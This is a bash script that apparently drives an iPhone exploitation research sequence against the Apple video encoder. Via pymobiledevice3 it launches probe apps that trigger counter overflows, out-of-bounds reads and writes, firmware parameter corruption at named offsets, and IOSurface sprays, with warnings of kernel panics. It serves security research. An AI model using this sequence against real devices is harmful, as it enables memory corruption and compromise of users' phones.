#!/bin/bash
# iphone_first_connect.sh — Run when iPhone Duo connects via USB
# This script runs the PRIORITY tests in order, stopping if MV-HEVC fails.
# Each test produces a log file in ~/Documents/ on the device.
#
# Usage: ./iphone_first_connect.sh [udid]
# If no UDID given, picks first USB device.

set -e

UDID="${1:-$(pymobiledevice3 usbmux list --usb 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d[0]['UniqueDeviceID']) if d else sys.exit(1)" 2>/dev/null)}"
if [ -z "$UDID" ]; then echo "ERROR: No USB device found"; exit 1; fi

echo "============================================"
echo "  iPhone Duo First Connect Test Sequence"
echo "  Device: $UDID"
echo "  Time: $(date)"
echo "============================================"

# Helper: run a probe and capture output
run_probe() {
    local bundle="$1"
    shift
    echo ""
    echo "=== Running: $bundle $* ==="
    echo "=== Time: $(date) ==="
    # Launch and capture
    pymobiledevice3 developer dvt launch "$UDID" "$bundle" "$@" 2>&1 || true
    echo "=== Done: $bundle $* ==="
    echo ""
}

echo ""
echo "PHASE 1: MV-HEVC Support Verification (MUST PASS)"
echo "=================================================="
run_probe com.research.avefwparam measure
echo ""
echo ">>> If the above shows 'MV-HEVC not supported', STOP HERE."
echo ">>> MV-HEVC requires iPhone 15 Pro or later hardware."
echo ">>> Press Enter to continue, or Ctrl+C to stop..."
read -r

echo ""
echo "PHASE 2: Safe Baselines"
echo "======================="
run_probe com.research.avecounteroverflow safe
run_probe com.research.avefullchain cumsum_predict

echo ""
echo "PHASE 3: Counter Overflow (THE GATING TESTS)"
echo "============================================="
echo ">>> 100 encodes = first OOB at ~86 encodes"
run_probe com.research.avecounteroverflow boundary
echo ""
echo ">>> 250 encodes = reaches firmware param array"
echo ">>> This may cause a kernel panic if corruption hits a critical path!"
echo ">>> Press Enter to continue, or Ctrl+C to stop..."
read -r
run_probe com.research.avecounteroverflow deep

echo ""
echo "PHASE 4: OOB Read (Info Leak)"
echo "=============================="
run_probe com.research.aveoobread multi
run_probe com.research.aveoobread overflow

echo ""
echo "PHASE 5: Firmware Parameter Corruption"
echo "======================================="
echo ">>> 220 encodes with lid=0x4141 — targets +0x5C34-0x5F94"
run_probe com.research.avefwparam param_array
echo ""
echo ">>> 210 encodes — SAFE stop before SIMD overwrite"
run_probe com.research.avefullchain simd_safe 0x4141

echo ""
echo "PHASE 6: Cross-Buffer & Spray"
echo "=============================="
run_probe com.research.avecrossbuffer measure
run_probe com.research.aveiosurfspray readback
echo ""
echo ">>> Full spray + encode test (may panic)"
echo ">>> Press Enter to continue, or Ctrl+C to stop..."
read -r
run_probe com.research.aveiosurfspray spray_and_encode

echo ""
echo "============================================"
echo "  Test Sequence Complete"
echo "  Time: $(date)"
echo "============================================"
echo ""
echo "Next: Collect log files from device ~/Documents/"
echo "  pymobiledevice3 developer dvt pull $UDID ~/Documents/ ./device_logs/"
